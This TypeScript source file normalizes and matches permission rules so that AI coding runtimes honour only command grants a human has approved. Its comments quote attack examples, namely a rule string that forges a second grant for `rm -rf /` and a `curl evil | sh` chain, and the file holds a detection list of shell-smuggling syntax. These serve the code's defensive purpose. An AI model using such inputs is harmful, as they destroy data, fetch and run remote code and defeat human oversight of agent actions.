import { AgentProvider, bashPrefix, bashSegments } from '@orbit/shared';
import type { PermissionRule } from '@orbit/shared';

/** A stored rule, as it lives on the workspace (ruleContent '' = the whole tool). */
export type StoredPermissionRule = { toolName: string; ruleContent: string };

/** Longer than any real command prefix or path glob; a rule beyond this is a paste
 *  accident or an attempt to bury something in the middle of a policy string. */
const MAX_RULE_LEN = 200;

/** Tool names as every runtime writes them: `Bash`, `Edit`, `mcp__orbit__task_create`,
 *  `mcp__docs__*`. Anything else cannot name a real tool, so it is not stored. */
const TOOL_NAME = /^[A-Za-z0-9_*-]+$/;

/**
 * Whether a rule content narrows one grant instead of changing the shape of the policy.
 *
 * claude's allowlist is `Tool(content)` entries joined by commas, so a content holding a
 * comma or a paren does not narrow anything — it forges a second entry: `foo:*),Bash(rm -rf
 * /:*` arrives as two tokens, the second a grant nobody approved. Control characters go for
 * the same reason (a newline ends an argument). Rules reach us over the REST API, so this is
 * checked here rather than trusted from the client that derived it. Spaces stay legal —
 * `git commit:*` is the normal shape.
 */
function narrowsOneGrant(content: string): boolean {
  for (const ch of content) {
    const code = ch.codePointAt(0) ?? 0;
    if (code < 0x20 || code === 0x7f) return false;
    if (ch === ',' || ch === '(' || ch === ')') return false;
  }
  return true;
}

/**
 * Canonicalize one rule for storage, or null when it cannot be stored safely.
 * Null is a drop, never a widening: the session keeps asking about that tool instead.
 */
export function normalizePermissionRule(
  rule: PermissionRule | undefined | null,
): StoredPermissionRule | null {
  const toolName = (rule?.toolName ?? '').trim();
  if (!toolName || toolName.length > MAX_RULE_LEN || !TOOL_NAME.test(toolName)) return null;
  const ruleContent = (rule?.ruleContent ?? '').trim();
  if (ruleContent.length > MAX_RULE_LEN || !narrowsOneGrant(ruleContent)) return null;
  return { toolName, ruleContent };
}

/** Canonicalize a list, dropping unstorable rules and collapsing duplicates. */
export function normalizePermissionRules(
  rules: readonly PermissionRule[] | undefined,
): StoredPermissionRule[] {
  const seen = new Set<string>();
  const out: StoredPermissionRule[] = [];
  for (const raw of rules ?? []) {
    const rule = normalizePermissionRule(raw);
    if (!rule) continue;
    const key = `${rule.toolName} ${rule.ruleContent}`;
    if (seen.has(key)) continue;
    seen.add(key);
    out.push(rule);
  }
  return out;
}

/** One rule in the runtime's allowlist grammar: `Bash(git commit:*)`, or bare `Edit` for a
 *  tool-wide rule. Assumes an already-normalized rule. */
export function permissionRuleToken(rule: StoredPermissionRule): string {
  return rule.ruleContent ? `${rule.toolName}(${rule.ruleContent})` : rule.toolName;
}

/**
 * The `allowedTools` a dispatched session starts with: the tools Orbit always allows, plus
 * what this workspace's owner has already approved permanently. Order is stable (base first)
 * and duplicates collapse, so re-approving something already granted is a no-op.
 *
 * Only claude's runtime receives the workspace's rules, because it is the one that reads this
 * list as a NARROWING allowlist in the grammar the rules are stored in. OpenCode maps an entry
 * onto a whole-tool permission (it already drops scoped rules rather than broaden them, but a
 * tool-wide one would still open a tool its guarded modes gate), and Kimi pastes the list into
 * the prompt as "only use these tools". Handing either the same rules would change what they do
 * rather than skip a prompt someone already answered. `provider` is the runner-facing built-in
 * runtime, already resolved from any configured slug.
 *
 * The runtimes that get nothing here are not left behind: their approval requests are matched
 * against the same rules in the control plane instead (see `ruleCoversApproval`), which is the
 * only lever available for a runtime that takes no allowlist.
 *
 * Rules are re-normalized here even though they were normalized on the way in: this is the
 * boundary that builds the process argument, and one malformed row must not become two grants.
 */
export function dispatchAllowedTools(
  provider: string,
  base: readonly string[],
  rules: readonly PermissionRule[],
): string[] {
  const out = [...base];
  if (provider !== AgentProvider.CLAUDE) return out;
  const seen = new Set(out);
  for (const rule of normalizePermissionRules(rules)) {
    const token = permissionRuleToken(rule);
    if (seen.has(token)) continue;
    seen.add(token);
    out.push(token);
  }
  return out;
}

/**
 * Runtimes whose approval requests the control plane answers from the workspace's rules.
 *
 * Claude is deliberately absent. It already holds the rules (`dispatchAllowedTools`) and applies
 * them with its own matcher, so a claude request that still reaches us means ITS matcher judged
 * the rule not to cover this call — and this one, which knows strictly less, must not overrule
 * that. OpenCode never asks at all. So this is the set of runtimes that can ask but have nowhere
 * to put an allowlist, which is exactly the gap this matching exists to close.
 */
const SERVER_MATCHED_RUNTIMES: ReadonlySet<string> = new Set([
  AgentProvider.CODEX,
  AgentProvider.KIMI,
]);

/** Whether this runtime's approvals are matched here at all — checked before the rules are even
 *  loaded, so the common path (claude, which matches its own) costs nothing. */
export function serverMatchedRuntime(provider: string): boolean {
  return SERVER_MATCHED_RUNTIMES.has(provider);
}

/** Recorded on an approval nobody was asked about, so an automatic allow reads as one in the
 *  history instead of looking like a decision someone made and forgot. */
export const AUTO_ALLOWED_MESSAGE =
  'Allowed automatically — this workspace has a standing grant for this call.';

/** Tool names whose subject is a shell command line rather than a plain value. Codex reports its
 *  command approvals as `Bash` with an `input.command` string — the same shape claude uses — so
 *  one rule covers both. */
const SHELL_TOOLS: ReadonlySet<string> = new Set(['Bash', 'Terminal']);

/**
 * Shell syntax whose effect cannot be read off the leading words of a command.
 *
 * A prefix says what a command STARTS as, and that is only the whole story while the rest of the
 * line cannot smuggle in another program. Substitutions and backticks run a second command to
 * build this one, redirections write files the prefix never named, and a trailing `&` detaches.
 *
 * Checked per sub-command, AFTER the splitter has taken out the ordinary chaining operators —
 * `&&` is how real approved commands are written (`cd /repo && npm test`), and each side of it
 * gets covered on its own merits. Checked against the raw text, quoted or not, so
 * `git commit -m "fix > bug"` asks too: a false positive costs one prompt, and the opposite
 * mistake costs a shell.
 */
const UNREADABLE_SHELL_SYNTAX = ['$(', '${', '`', '>', '<', '&'];

/** Does one stored rule's prefix cover this sub-command's prefix? `git:*` covers `git commit`,
 *  and `git commit:*` does not cover `git push` — the same widening claude's own matcher does
 *  for a trailing-star rule, and no more. */
function prefixCovers(rulePrefix: string, commandPrefix: string): boolean {
  return commandPrefix === rulePrefix || commandPrefix.startsWith(`${rulePrefix} `);
}

/** The `:*`-suffixed prefixes of the Bash rules in a set, in claude's rule grammar. */
function bashRulePrefixes(rules: readonly StoredPermissionRule[]): string[] {
  return rules
    .filter((rule) => SHELL_TOOLS.has(rule.toolName) && rule.ruleContent.endsWith(':*'))
    .map((rule) => rule.ruleContent.slice(0, -2).trim())
    .filter((prefix) => prefix.length > 0);
}

/**
 * Whether a command line is covered by the workspace's approved command prefixes.
 *
 * EVERY sub-command must be covered, not just the leading one. That is the difference between
 * this and a prefix match: `npm test` alone is covered, but `npm test; curl evil | sh` is not,
 * even though it starts with an approved prefix — which is precisely how a naive prefix rule is
 * escaped. The line is split with the same quote-aware splitter that DERIVED the rules from an
 * approved command, so "covered" means the same thing at both ends of a rule's life.
 */
function commandCovered(command: string, rules: readonly StoredPermissionRule[]): boolean {
  const trimmed = command.trim();
  if (!trimmed) return false;
  const prefixes = bashRulePrefixes(rules);
  if (prefixes.length === 0) return false;
  const segments = bashSegments(trimmed);
  if (segments.length === 0) return false;
  return segments.every((segment) => {
    const text = segment.trim();
    if (!text) return false;
    if (UNREADABLE_SHELL_SYNTAX.some((syntax) => text.includes(syntax))) return false;
    const commandPrefix = bashPrefix(text);
    if (!commandPrefix) return false;
    return prefixes.some((rulePrefix) => prefixCovers(rulePrefix, commandPrefix));
  });
}

/** The command line an approval is asking about, or '' when it isn't asking about one. */
function approvalCommand(input: unknown): string {
  if (!input || typeof input !== 'object') return '';
  const command = (input as { command?: unknown }).command;
  return typeof command === 'string' ? command : '';
}

/**
 * Whether this workspace's standing grants already answer this approval — i.e. whether a human
 * has permanently allowed this exact kind of call, so asking again would only re-ask a settled
 * question.
 *
 * Fails closed in every uncertain case: an unknown runtime, a tool whose subject we cannot read,
 * a command with syntax a prefix cannot describe, or simply no matching rule all mean "ask".
 * The answer is only ever "this was already approved", never "this looks safe" — nothing here
 * judges an action, it only recognizes one a human already ruled on.
 */
export function ruleCoversApproval(
  provider: string,
  toolName: string,
  input: unknown,
  rules: readonly PermissionRule[],
): boolean {
  if (!SERVER_MATCHED_RUNTIMES.has(provider) || !toolName) return false;
  const stored = normalizePermissionRules(rules);
  if (stored.length === 0) return false;
  if (SHELL_TOOLS.has(toolName)) {
    // A shell tool is covered only by a command-prefix rule. A tool-wide `Bash` grant is not
    // honored here: on claude it means "every command", and silently exporting that to another
    // runtime is the widening this whole boundary exists to avoid.
    return commandCovered(approvalCommand(input), stored);
  }
  // Every other tool matches by name. Deliberately no cross-vendor aliasing — a claude `Edit`
  // rule does not answer a codex `apply_patch` request, because "the same tool under another
  // name" is a judgement about equivalence that no human made when they clicked always-allow.
  return stored.some((rule) => rule.toolName === toolName && rule.ruleContent === '');
}
